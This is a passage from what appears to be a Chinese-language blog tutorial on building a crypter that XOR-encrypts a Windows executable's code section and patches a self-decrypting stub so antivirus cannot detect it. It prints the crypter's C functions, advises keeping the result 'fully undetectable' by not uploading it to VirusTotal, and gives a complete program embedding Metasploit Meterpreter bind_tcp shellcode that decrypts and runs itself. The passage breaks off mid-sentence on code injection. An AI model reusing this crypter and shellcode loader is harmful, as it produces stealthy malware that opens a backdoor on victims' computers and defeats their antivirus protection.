Trouble reading nItems = %d \n&quot;</span>,nItems);</span><br><span class="line">fclose(fptr);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Encrypt buffer */</span></span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span> ; i &lt; nbytes ; i++ )</span><br><span class="line">    &#123;</span><br><span class="line">buffer[i]=buffer[i]^key[cpt];</span><br><span class="line">cpt = cpt + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(cpt == keyLength)</span><br><span class="line">cpt = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Replace current .code section in file by encrypted one */</span></span><br><span class="line"><span class="keyword">if</span>(fseek(fptr, fileOffset, SEEK_SET)!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;cipherBytes: Unable to set file pointer to %ld \n&quot;</span>, fileOffset);</span><br><span class="line">fclose(fptr);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">nItems = fwrite(buffer, <span class="keyword">sizeof</span>(BYTE), nbytes, fptr);</span><br><span class="line"><span class="keyword">if</span>(nItems  &lt;nbytes)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;cipherBytes: Trouble writing nItems = %d \n&quot;</span>,nItems);</span><br><span class="line">fclose(fptr);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Successfully ciphered %d bytes\n&quot;</span>,nbytes);</span><br><span class="line">fclose(fptr);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="补丁.stub部分">补丁.stub部分</h3><p>加密 .code 部分后，我们需要修补 .stub 部分，以便目标可以自行解密。在这个函数中，我们：</p><ul><li>打开二进制目标文件</li><li>寻找 .stub 段</li><li>在缓冲区中加载 .stub 段</li><li>找到 CODE_BASE_ADDRESS 和 CODE_SIZE</li><li>用虚拟内存偏移量和 .code 部分的大小替换值</li><li>写补丁缓冲区代替 .stub 段</li><li>关闭文件并离开</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Patch the filepath file (the .stub segment)</span></span><br><span class="line"><span class="comment"> * Here we replace CODE_BASE_ADDRESS and CODE_SIZE by newBaseAddr and newSegSize</span></span><br><span class="line"><span class="comment"> * newBaseAddr is the Virtual memory base address of .code segment in target file</span></span><br><span class="line"><span class="comment"> * newSegSize contains the size of the target file .code segment</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">patchStub</span><span class="params">(<span class="keyword">char</span> * filepath,  SEGMENT_INFO_PTR addrInfo, DWORD newBaseAddr, DWORD newSegSize )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD fileOffset;</span><br><span class="line">DWORD nbytes;</span><br><span class="line">DWORD nItems;</span><br><span class="line"><span class="comment">/* Signature to locate where segment memory base address should be written */</span></span><br><span class="line">BYTE baseAddrSignature[] = &#123; <span class="number">0x15</span>, <span class="number">0x15</span>, <span class="number">0x15</span>, <span class="number">0x15</span>, <span class="number">0x00</span> &#125;; </span><br><span class="line"><span class="comment">/* Signature to locate where segment size should be written*/</span></span><br><span class="line">BYTE segSizeSignature[] = &#123; <span class="number">0x14</span>, <span class="number">0x14</span>, <span class="number">0x14</span>, <span class="number">0x14</span>, <span class="number">0x00</span> &#125;; </span><br><span class="line">BYTE * baseAddrAddress = <span class="literal">NULL</span>;</span><br><span class="line">BYTE * segSizeAddress = <span class="literal">NULL</span>;</span><br><span class="line">BYTE *buffer;</span><br><span class="line">FILE* fptr;</span><br><span class="line">fileOffset = addrInfo-&gt;fileSegmentOffset;</span><br><span class="line">nbytes = addrInfo-&gt;fileSegmentSize;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Allocate memory in buffer that will store content of segment */</span></span><br><span class="line">buffer = (BYTE*)<span class="built_in">malloc</span>(nbytes);</span><br><span class="line"><span class="keyword">if</span>(buffer == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;patchStub: malloc error \n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Open binary file */</span></span><br><span class="line">    fptr = fopen(filepath, <span class="string">&quot;r+b&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(fptr == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;patchStub: fopen error \n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Seek .stub section using calculated offset*/</span></span><br><span class="line"><span class="keyword">if</span>(fseek(fptr, addrInfo-&gt;fileSegmentOffset, SEEK_SET)!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;patchStub: Unable to set file pointer to %ld \n&quot;</span>, addrInfo-&gt;fileSegmentOffset);</span><br><span class="line">fclose(fptr);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Copy content of stub segment into buffer */</span></span><br><span class="line">nItems = fread(buffer, <span class="keyword">sizeof</span>(BYTE), nbytes, fptr);</span><br><span class="line"><span class="keyword">if</span>(nItems  &lt;nbytes)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;patchStub: Trouble reading nItems = %d \n&quot;</span>,nItems);</span><br><span class="line">fclose(fptr);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Search the baseAddress in buffer section */</span></span><br><span class="line">baseAddrAddress = binStrstr(buffer,baseAddrSignature);</span><br><span class="line"><span class="comment">/* Change base Address by calculated value */</span></span><br><span class="line"><span class="built_in">memcpy</span>(baseAddrAddress,&amp;newBaseAddr,<span class="keyword">sizeof</span>(newBaseAddr));</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Search the baseAddress in buffer section */</span></span><br><span class="line">segSizeAddress = binStrstr(buffer,segSizeSignature);</span><br><span class="line"><span class="comment">/* Change base Address by calculated value */</span></span><br><span class="line"><span class="built_in">memcpy</span>(segSizeAddress,&amp;newSegSize,<span class="keyword">sizeof</span>(newSegSize));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Replace current .stub section in file by patched one */</span></span><br><span class="line"><span class="keyword">if</span>(fseek(fptr, fileOffset, SEEK_SET)!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;patchStub: Unable to set file pointer to %ld \n&quot;</span>, fileOffset);</span><br><span class="line">fclose(fptr);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">nItems = fwrite(buffer, <span class="keyword">sizeof</span>(BYTE), nbytes, fptr);</span><br><span class="line"><span class="keyword">if</span>(nItems  &lt;nbytes)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;patchStub: Trouble writing nItems = %d \n&quot;</span>,nItems);</span><br><span class="line">fclose(fptr);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Successfully patched file\n&quot;</span>);</span><br><span class="line">fclose(fptr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="main部分">main部分</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * Cryptor entry point </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *fileName;</span><br><span class="line">HANDLE hFile;</span><br><span class="line">HANDLE hFileMapping;</span><br><span class="line">LPVOID fileBaseAddress;</span><br><span class="line">BOOL retVal;</span><br><span class="line"><span class="comment">/* To store information of .code and .stub segments */</span></span><br><span class="line">SEGMENT_INFO codeSegmentInfo;</span><br><span class="line">SEGMENT_INFO stubSegmentInfo;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(argc &lt;<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;main: Not enough arguments&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">fileName = argv[<span class="number">1</span>];</span><br><span class="line"><span class="comment">/* Map target file */</span></span><br><span class="line">retVal = getHMODULE(fileName, &amp;hFile, &amp;hFileMapping, &amp;fileBaseAddress);</span><br><span class="line"><span class="keyword">if</span>(retVal==FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Init structures */</span></span><br><span class="line">codeSegmentInfo.moduleBase = (DWORD)<span class="literal">NULL</span>;</span><br><span class="line">codeSegmentInfo.memorySegmentOffset = (DWORD)<span class="literal">NULL</span>;</span><br><span class="line">codeSegmentInfo.fileSegmentOffset = (DWORD)<span class="literal">NULL</span>;</span><br><span class="line">codeSegmentInfo.fileSegmentSize = (DWORD)<span class="literal">NULL</span>;</span><br><span class="line">stubSegmentInfo.moduleBase = (DWORD)<span class="literal">NULL</span>;</span><br><span class="line">stubSegmentInfo.memorySegmentOffset = (DWORD)<span class="literal">NULL</span>;</span><br><span class="line">stubSegmentInfo.fileSegmentOffset = (DWORD)<span class="literal">NULL</span>;</span><br><span class="line">stubSegmentInfo.fileSegmentSize = (DWORD)<span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Fill segments information */</span></span><br><span class="line">getSegmentsInfo(fileBaseAddress,&amp;codeSegmentInfo,&amp;stubSegmentInfo);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n\n=======================\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;.code segment information: \n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;RAM image base=0x%08X\n&quot;</span>,codeSegmentInfo.moduleBase);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;RAM segment offset=0x%08X\n&quot;</span>,codeSegmentInfo.memorySegmentOffset);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;File offset of code =0x%08X\n&quot;</span>,codeSegmentInfo.fileSegmentOffset);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;File size of code=0x%08X\n&quot;</span>,codeSegmentInfo.fileSegmentSize);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n\n=======================\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;.stub segment information: \n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;RAM image base=0x%08X\n&quot;</span>,stubSegmentInfo.moduleBase);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;RAM segment offset=0x%08X\n&quot;</span>,stubSegmentInfo.memorySegmentOffset);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;File offset of code =0x%08X\n&quot;</span>,stubSegmentInfo.fileSegmentOffset);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;File size of code=0x%08X\n&quot;</span>,stubSegmentInfo.fileSegmentSize);</span><br><span class="line">closeHandles(hFile, hFileMapping,fileBaseAddress);</span><br><span class="line">cipherBytes(fileName,&amp;codeSegmentInfo);</span><br><span class="line"> </span><br><span class="line">patchStub(fileName,&amp;stubSegmentInfo,codeSegmentInfo.moduleBase+codeSegmentInfo.memorySegmentOffset,codeSegmentInfo.fileSegmentSize);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="测试">测试</h1><h2 id="virustotal">VirusTotal</h2><p>VirusTotal（<a href="https://www.77169.net/go?url=https://www.virustotal.com">https://www.virustotal.com</a>）是针对多个AV的在线扫描的参考平台。</p><blockquote><p>众所周知，如果你想要一个未被检测到的恶意软件来保留FUD特性，你应该永远不会发送到VirusTotal</p></blockquote><p>FUD(Fully undetectable),完全不被检测</p><h2 id="加密的恶意软件">加密的恶意软件</h2><p>这里的完整代码：https://blog.sevagas.com/Hide-meterpreter-shellcode-in-executable</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Declare new sections to store encrypted code and shellcode data */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> section(<span class="meta-string">&quot;.code&quot;</span>,execute, read, write)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> section(<span class="meta-string">&quot;.codedata&quot;</span>, read, write)</span></span><br><span class="line"><span class="comment">// Merge  .codedata into .code (which will be encrypted by cryptor)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/MERGE:.codedata=.code&quot;</span>)</span></span><br><span class="line"><span class="comment">// Declare .code as Executable, Read, Write section, this is necessary so application rewrites itself</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/SECTION:.code,ERW&quot;</span>)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// This will put all following constants and global variables in .codedata segment</span></span><br><span class="line"><span class="comment">// 这会将所有以下常量和全局变量放在 .codedata 段中</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">&quot;.codedata&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> const_seg(<span class="meta-string">&quot;.codedata&quot;</span>)</span></span><br><span class="line"><span class="comment">// From here executable code will go in .code section</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> code_seg(<span class="meta-string">&quot;.code&quot;</span>)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * windows/meterpreter/bind_tcp - 298 bytes (stage 1)</span></span><br><span class="line"><span class="comment"> * http://www.metasploit.com</span></span><br><span class="line"><span class="comment"> * VERBOSE=false, LPORT=80, RHOST=, EnableStageEncoding=false, </span></span><br><span class="line"><span class="comment"> * PrependMigrate=false, EXITFUNC=process, AutoLoadStdapi=true, </span></span><br><span class="line"><span class="comment"> * InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true, </span></span><br><span class="line"><span class="comment"> * EnableUnicodeEncoding=true</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2&quot;</span></span><br><span class="line"><span class="string">&quot;\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85&quot;</span></span><br><span class="line"><span class="string">&quot;\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3&quot;</span></span><br><span class="line"><span class="string">&quot;\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\xdb\x53\x68\x02\x00\x00\x50\x89\xe6\x6a\x10\x56\x57\x68\xc2&quot;</span></span><br><span class="line"><span class="string">&quot;\xdb\x37\x67\xff\xd5\x53\x57\x68\xb7\xe9\x38\xff\xff\xd5\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x97\x68\x75\x6e\x4d&quot;</span></span><br><span class="line"><span class="string">&quot;\x61\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9&quot;</span></span><br><span class="line"><span class="string">&quot;\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3&quot;</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Launch the meterpreter shellcode */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shellLaunch</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">    <span class="comment">/* Declare pointer on function */</span></span><br><span class="line">    <span class="keyword">int</span> (*func) ();</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Cast shellcode into function */</span></span><br><span class="line">    func = (<span class="keyword">int</span> (*) ()) buf;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Call function (Execute shellcode) */</span></span><br><span class="line">    (<span class="keyword">int</span>) (*func) ();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">// .stub SECTION , the following part is not encrypted.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> section(<span class="meta-string">&quot;.stub&quot;</span>, execute, read, write)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> code_seg(<span class="meta-string">&quot;.stub&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> section(<span class="meta-string">&quot;.stubdata&quot;</span>, read, write)</span></span><br><span class="line"><span class="comment">// Merge  .stubdata into .stub (decryption part)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/MERGE:.stubdata=.stub&quot;</span>)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// This will put out strings and global variables in .stubdata segment</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">&quot;.stubdata&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> const_seg(<span class="meta-string">&quot;.stubdata&quot;</span>)</span></span><br><span class="line"><span class="comment">// Executable code will go in .stub section</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> code_seg(<span class="meta-string">&quot;.stub&quot;</span>)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">// Next data are signature recognized by cryptor to patch the target</span></span><br><span class="line"><span class="comment">// 下一个数据是加密器识别的签名以修补目标</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE_BASE_ADDRESS0x15151515 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE_SIZE0x14141414 </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Decrypt .code block encrypted by cryptor */</span></span><br><span class="line"><span class="comment">/* In this function do not declare array to avoid security cookies checks (see http://msdn.microsoft.com/en-us/library/8dbf701c.aspx) */</span></span><br><span class="line"><span class="comment">/* Or disable security check (GS- option) on prog compilation */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decryptCodeSection</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *ptr;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">int</span> nbytes;</span><br><span class="line">DWORD patience;</span><br><span class="line">DWORD codeAddr;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span> cpt = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">BYTE  key[] = &#123; <span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> keyLength = <span class="number">8</span>;</span><br><span class="line">ptr = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)CODE_BASE_ADDRESS;</span><br><span class="line">nbytes = CODE_SIZE;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Decrypt code segment    </span></span><br><span class="line">        <span class="keyword">for</span>( i = <span class="number">0</span> ; i &lt; nbytes ; i++ )</span><br><span class="line">        &#123;</span><br><span class="line">ptr[i]=ptr[i]^key[cpt];</span><br><span class="line">cpt = cpt + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(cpt == keyLength)</span><br><span class="line">cpt = <span class="number">0</span>;</span><br><span class="line">         &#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">decryptCodeSection();</span><br><span class="line">shellLaunch(); <span class="comment">/* Call function which executes shellcode now that it is decrypted */</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><h1 id="复杂的方法">复杂的方法</h1><h2 id="代码注入方法">代码注入方法</h2><p>代码注入指在另一个进程内运行代码。这个一般通过DLL注入来实现，但也有其他可能存在的方法，甚至可能直接注入完整的exe： 